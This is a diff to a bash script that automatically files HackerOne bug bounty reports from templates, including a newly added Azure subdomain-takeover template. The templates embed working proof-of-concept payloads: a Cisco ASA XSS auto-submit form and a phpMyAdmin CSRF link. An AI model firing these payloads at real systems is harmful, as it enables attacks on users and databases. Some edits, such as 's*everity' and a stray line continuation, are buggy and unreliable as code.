@@ -4,20 +4,34 @@
 #load credentials and other params
 source ./config.ini
 
-if [[ -z "$1" ]] || [[ -z "$2" ]] || [[ -z "$3" ]] || [[ -z "$4" ]]; then
+if [[ -z "$1" ]] || [[ -z "$2" ]] || [[ -z "$3" ]]; then
     #production mode runs the API call against your real real real account (be careful)
-    #testing mode runs the API call against a testing program created in the sandbox
     #dry-run mode does not run the API call. Useful to debug the parameters without sending anything to H1
-    echo "Use ${FUNCNAME[0]} (test mode: -t, -p is production mode, -d is dry run mode) programName vulnerableDomain bug "
-    echo "Example ${FUNCNAME[0]} att www.att.com [-t, -n, -d] CVE-2020-3580"
+    echo -e "Use: \n -t test mode\n testing mode runs the API call against a testing program created in the sandbox\n ${BASH_SOURCE[0]} -t vulnerableDomain bug"
+    # -p is production mode \n -d is dry run mode \n programName vulnerableDomain bug "
+    #echo "Example {BASH_SOURCE[0]} att www.att.com [-t, -n, -d] CVE-2020-3580"
+    bugs="\nSupported bugs:\n Cisco POST XSS (CVE-2020-3580)\n phpmyadmin CSRF (CVE-2019-12616)\n open redirect (open-redirect)\n \
+          generic xss (xss)\n s3 subdomain takeover (s3takeover)\n XSS Swagger UI (xssSwagger)\n Azure cloudapp subdomain takeover (azureCloudAppSto)"
+    echo -e $bugs
     exit 1
 fi
 
 #input params
 mode=$1
-program=$2
-domain=$3
-bug=$4
+if [[ "$mode" == "-t" ]]; then
+    #from config file 
+    program=$testProgram
+    echo "Parameters: $@"
+    set -- "$1" "" "$2" "$3" "$4" "$5"
+    echo "Updated parameters: $@"
+    domain=$3
+    bug=$4
+else
+    program=$2
+    domain=$3
+    bug=$4
+
+fi
 
 #global vars
 apiEndpoint="https://api.hackerone.com/v1/hackers/reports"
@@ -38,7 +52,8 @@ if [[ "$bug" == "CVE-2020-3580" ]]; then
     bodySummary="Multiple vulnerabilities in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct cross-site scripting (XSS) attacks against a user of the web services interface of an affected device. \n\n "
     bodyStepsToRep="Steps To Reproduce \n\n Go to this  URL \n\n "$URL" \n\n HTML POC:\n \n <html>\n  <body>\n <script>history.pushState('', '', '/')</script>\n <form action='https://'$domain'/+CSCOE+/saml/sp/acs?tgname=a' method='POST'>\n <input type='hidden' name='SAMLResponse' value='&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;document&#46;cookies&#41;&gt;'/>\n </form>\n <script>\n document.forms[0].submit();\n</script>\n</body>\n</html>\n\n"
     body="$bodySummary$bodyStepsToRep"
-    impact="- An attacker could exploit these vulnerabilities by persuading a user of the interface to click a crafted link.\n - A successful exploit could allow the attacker to execute arbitrary script code in the context of the interface or allow the attacker to access sensitive, browser-based information. \n\n Note: These vulnerabilities affect only specific AnyConnect and WebVPN configurations.\n\n Supporting Material References\n https://www.exploit-db.com/exploits/47988\n https://twitter.com/sagaryadav8742/status/1275170967527006208\n"
+    impact="- An attacker could exploit these vulnerabilities by persuading a user of the interface to click a crafted link.\n - A successful exploit could allow the attacker to execute arbitrary script code in the context of the interface or allow the attacker to access sensitive, browser-based information. \n\n Note: These vulnerabilities affect only specific AnyConnect and WebVPN configurations.\n\n Supporting Material References\n https://www.exploit-db.com/exploits/47988\n https://twitter.com/sagaryadav8742/status/1275170967527006208\n"\
+    severity="medium"
     weaknessId=61
 
 #phpmyadmin CVE-2019-12616
@@ -54,6 +69,7 @@ elif [[ "$bug" == "CVE-2019-12616" ]]; then
     bodyStepsToRep="PhpMyAdmin endpoint  \n - https://"$domain"/phpmyadmin/\n\nCreate a HTML file with the following content\n\n<html>\n<head>\n<title>POC CVE-2019-12616</title>\n</head>\n<body>\n<a href='https://"$domain"/phpmyadmin/tbl_sql.php?sql_query=INSERT+INTO+\`pma__bookmark\`+(\`id\`%2C+\`dbase\`%2C+\`user\`%2C+\`label\`%2C+\`query\`)+VALUES+(DAYOFWEEK('')%2C+''%2C+''%2C+''%2C+'')&show_query=1&db=phpmyadmin&table=pma__bookmark'>View my Pictures!</a>\n</body>\n</html>\n\nAn attacker can create a page using the above HTML code, trick the victim into clicking the URL and performing Insert/Delete actions to the database. "
     body="$bodySummary$bodyStepsToRep"
     impact="An attacker can perform arbitrary actions on behalf of the victim, such as execute arbitrary INSERT or DELETE statements, delete an arbitrary server on the Setup page. \n\n Supporting Material/References \n* https://nvd.nist.gov/vuln/detail/CVE-2019-12616\n* **Exploit** https://www.exploit-db.com/exploits/46982"
+    severity="medium"
     weaknessId=45
 
 #generic open redirect bug
@@ -95,8 +111,8 @@ elif [[ "$bug" == "s3takeover" ]]; then
     bodyStepsToRep="Steps To Reproduce\n\n Go to this URL:\n"$url
     body="$bodySummary$bodyStepsToRep"
     impact="- It's extremely vulnerable to attacks as a malicious user could create any web page with any content and host it on the $domain domain. This would allow them to post malicious content which would be mistaken for a valid site.\n"
-    severity="high"
-    weaknessId=61 #145
+    s*everity="high"
+    weaknessId=61
 
 #XSS Swagger UI
 elif [[ "$bug" == "xssSwagger" ]]; then
@@ -113,7 +129,32 @@ elif [[ "$bug" == "xssSwagger" ]]; then
     body="$bodySummary$bodyStepsToRep"
     impact="Reflected XSS could lead to data theft through the attacker’s ability to manipulate data through their access to the application, and their ability to interact with other users, including performing other malicious attacks, which would appear to originate from a legitimate user.\nBecause it's a Swagger software, it's possible for an attacker to steal the user's api keys/credentials to execute API calls and obtain sensitive information." 
     severity="medium"
-    weaknessId=61 #145
+    weaknessId=61
+
+#Azure cloudapp subdomain takeover
+elif [[ "$bug" == "azureCloudAppSto" ]]; then
+
+    #input
+    if [[ -z "$5" ]]; then
+        echo "For this bug you need to include the archived URL"
+        exit 1
+    fi 
+    if [[ -z "$6" ]]; then
+        echo "For this bug you need to include the CNAME the vuln domain is pointing to"
+        exit 1
+    fi
+ 
+    archivedURL=$5
+    cname=$6
+
+    url="https://$domain"
+    title='Azure Cloud App subdomain takeover ['$domain']'    
+    bodySummary="The subdomain \`$domain\` was pointing to an Azure App service domain \`$cname\`, but that endpoint was not registered. I just created the instance and added the domain as custom domain. \n\n"
+    bodyStepsToRep="## Steps To Reproduce\n\n Go to this URL:\n$url\n\n You will see a blank page, but checking the source code you will see proof of the take over:\n \`\`\`\n <html> \n <!-- poc by pdelteil --> </html>\n \`\`\` \nArchived version: $archivedURL"
+    body="$bodySummary$bodyStepsToRep"
+    impact="It's extremely vulnerable to attacks as a malicious user could create any web page with any content and host it on the vulnerable domain. This would allow them to post malicious content which would be mistaken for a valid site. \n They could perform several attacks like:\n - Cookie Stealing\n - Phishing campaigns. \n - Bypass Content-Security Policies and CORS." 
+    severity="medium"
+    weaknessId=26 
 else
     echo "$bug, Bug type not found"
     exit 1 
@@ -126,7 +167,7 @@ data='{"data": {"type": "report",
        "vulnerability_information": "'$body'",
        "severity_rating": "'$severity'",
        "weakness_id": '$weaknessId',
-       "impact": "'$impact'"}}}'
+       "impact": "'$impact'\n\n'$disclaimer'"}}}'
 
 #TODO parse api response
 
@@ -148,7 +189,8 @@ if [[ "$mode" == "-p" ]]; then
 fi 
 #testing mode
 if [[ "$mode" == "-t" ]]; then
-    echo -e "\033[0;33mRunning in testing mode\033[0m"
+    echo -e "\033[0;33mRunning in testing mode\033[0m\n"
+    echo "Program: $program"
     echo "Making API call"
     curl $apiEndpoint -u "$usernameTesting:$apikeyTesting" \
                       -H 'Content-Type: application/json' \
